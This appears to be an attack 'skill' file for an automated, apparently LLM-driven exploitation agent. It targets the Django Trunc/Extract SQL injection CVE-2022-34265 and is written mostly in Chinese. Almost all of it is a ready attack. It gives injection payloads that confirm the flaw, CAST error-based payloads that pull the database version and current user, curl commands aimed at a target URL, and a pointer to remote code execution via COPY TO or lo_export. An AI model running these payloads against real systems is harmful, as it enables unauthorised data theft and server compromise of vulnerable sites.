---
name: django-trunc-extract-sql-injection
description: Exploits CVE-2022-34265 in Django's Trunc()/Extract() functions where the kind parameter is unsanitized leading to SQL injection. Targets PostgreSQL error-based data extraction with CAST errors.
skill_type: exploit
severity: critical
tags: [django, sql-injection, cve-2022-34265, sqli, postgresql, python]
---

# Django Trunc/Extract SQL 注入 (CVE-2022-34265)

## Essential Principles

Django Trunc()/Extract() 未过滤 kind 参数导致 SQL 注入。
注入上下文: `DATE_TRUNC('kind', column)`

利用链:

1. **确认注入**: `?date=year'` → ProgrammingError
2. **数据提取**: 用 CAST 错误泄露数据
   `?date=year' AND 1=CAST(version() AS INT)--`
   → PostgreSQL 尝试将版本字符串转 INT → 报错包含版本信息
3. **RCE 尝试（需要高权限）**: COPY ... TO 写文件 / lo_export

## When to Use

- 目标使用 Django 框架且版本低于 3.2.14 / 4.0.6
- URL 参数中存在 date/kind 等 Trunc/Extract 参数

## When NOT to Use

- Django 版本已修补（>= 3.2.14 / >= 4.0.6）
- 数据库不是 PostgreSQL（报错注入失败）

## Path Selection

| 条件 | 路径 | 用途 |
|------|------|------|
| sqli_confirmed | error_based_extract | CAST 错误数据提取 |
| 其他情况 | llm_freeform | LLM 自由推理 |

## Quick Start

```bash
# 确认注入
curl "http://target.com/?date=year'"

# 提取版本
curl "http://target.com/?date=year' AND 1=CAST(version() AS INTEGER)--"

# 提取当前用户
curl "http://target.com/?date=year' AND 1=CAST(current_user AS INTEGER)--"
```
